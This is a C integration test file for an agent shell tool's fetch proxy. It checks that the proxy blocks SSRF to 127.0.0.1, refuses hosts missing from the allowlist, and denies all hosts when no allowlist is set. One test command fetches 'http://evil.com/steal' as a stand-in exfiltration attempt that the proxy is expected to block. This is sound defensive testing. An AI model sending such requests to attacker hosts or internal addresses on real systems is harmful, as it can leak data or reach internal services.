/* T135: integration test — mjs fetch proxy end-to-end through tool_shell_handler.
 * Verifies V49 (socketpair proxy), V50 (protocol), V47 (policy enforcement).
 * Agent spawns shell_exec("mjs -e 'http_fetch(...)'"), proxy handles request. */
#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <curl/curl.h>
#include "tool_shell.h"

static int tests_run = 0;
static int tests_passed = 0;

#define TEST(name) do { tests_run++; printf("  %s... ", #name); } while(0)
#define PASS() do { tests_passed++; printf("PASS\n"); } while(0)
#define FAIL(msg) do { printf("FAIL: %s\n", msg); return; } while(0)

/* T135: mjs fetch through proxy — host in allowed_hosts but resolves to private IP.
 * Proves: socketpair created, mjs sends request, proxy receives + checks policy,
 * error response flows back to mjs stdout. Full V49/V50 protocol. */
static void test_proxy_private_ip_blocked(void) {
    TEST(proxy_private_ip_blocked);

    char *hosts[] = {"127.0.0.1"};
    ShellConfig sc = {
        .timeout = 10,
        .workspace = NULL,
        .shell_network = 1,  /* need network for nothing, but skip CLONE_NEWNET */
        .allowed_hosts = hosts,
        .allowed_hosts_count = 1
    };

    /* mjs fetches 127.0.0.1 — in allowed_hosts but blocked by SSRF */
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "{\"command\":\"./build/mjs -e 'var r = http_fetch(\\\"http://127.0.0.1:9999/test\\\"); r.error'\"}");

    char *result = tool_shell_handler(cmd, &sc);
    if (!result) FAIL("tool_shell_handler returned NULL");

    /* Proxy should return SSRF error via protocol — mjs prints the error field */
    if (!strstr(result, "private IP")) {
        printf("got: %s\n", result);
        free(result);
        FAIL("expected 'private IP' in output");
    }

    free(result);
    PASS();
}

/* T135: mjs fetch — host NOT in allowed_hosts → 403 */
static void test_proxy_denied_host(void) {
    TEST(proxy_denied_host);

    char *hosts[] = {"api.example.com"};
    ShellConfig sc = {
        .timeout = 10,
        .workspace = NULL,
        .shell_network = 1,
        .allowed_hosts = hosts,
        .allowed_hosts_count = 1
    };

    /* mjs fetches evil.com — not in allowed_hosts */
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "{\"command\":\"./build/mjs -e 'var r = http_fetch(\\\"http://evil.com/steal\\\"); r.error'\"}");

    char *result = tool_shell_handler(cmd, &sc);
    if (!result) FAIL("tool_shell_handler returned NULL");

    if (!strstr(result, "not in allowed_hosts")) {
        printf("got: %s\n", result);
        free(result);
        FAIL("expected 'not in allowed_hosts' in output");
    }

    free(result);
    PASS();
}

/* T135: mjs fetch — no allowed_hosts configured → deny all */
static void test_proxy_no_allowlist(void) {
    TEST(proxy_no_allowlist);

    ShellConfig sc = {
        .timeout = 10,
        .workspace = NULL,
        .shell_network = 1,
        .allowed_hosts = NULL,
        .allowed_hosts_count = 0
    };

    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "{\"command\":\"./build/mjs -e 'var r = http_fetch(\\\"http://any.host/path\\\"); r.error'\"}");

    char *result = tool_shell_handler(cmd, &sc);
    if (!result) FAIL("tool_shell_handler returned NULL");

    if (!strstr(result, "no allowed_hosts")) {
        printf("got: %s\n", result);
        free(result);
        FAIL("expected 'no allowed_hosts' in output");
    }

    free(result);
    PASS();
}

/* T136: mjs pipeline composability — fetch fd doesn't interfere with stdout piping */
static void test_proxy_pipe_composability(void) {
    TEST(proxy_pipe_composability);

    char *hosts[] = {"example.com"};
    ShellConfig sc = {
        .timeout = 10,
        .workspace = NULL,
        .shell_network = 1,
        .allowed_hosts = hosts,
        .allowed_hosts_count = 1
    };

    /* mjs prints multi-line output, piped through grep — fetch fd must not interfere */
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "{\"command\":\"./build/mjs -e '\\\"apple\\\\nbanana\\\\ncherry\\\"' | grep banana\"}");

    char *result = tool_shell_handler(cmd, &sc);
    if (!result) FAIL("tool_shell_handler returned NULL");

    if (!strstr(result, "banana")) {
        printf("got: %s\n", result);
        free(result);
        FAIL("expected 'banana' in piped output");
    }
    /* Verify other lines filtered out */
    if (strstr(result, "apple") || strstr(result, "cherry")) {
        printf("got: %s\n", result);
        free(result);
        FAIL("grep should have filtered other lines");
    }

    free(result);
    PASS();
}

int main(void) {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    printf("--- test_integration_mjs_proxy (T135, T136) ---\n");
    test_proxy_private_ip_blocked();
    test_proxy_denied_host();
    test_proxy_no_allowlist();
    test_proxy_pipe_composability();
    printf("%d/%d passed\n", tests_passed, tests_run);
    curl_global_cleanup();
    return tests_passed == tests_run ? 0 : 1;
}
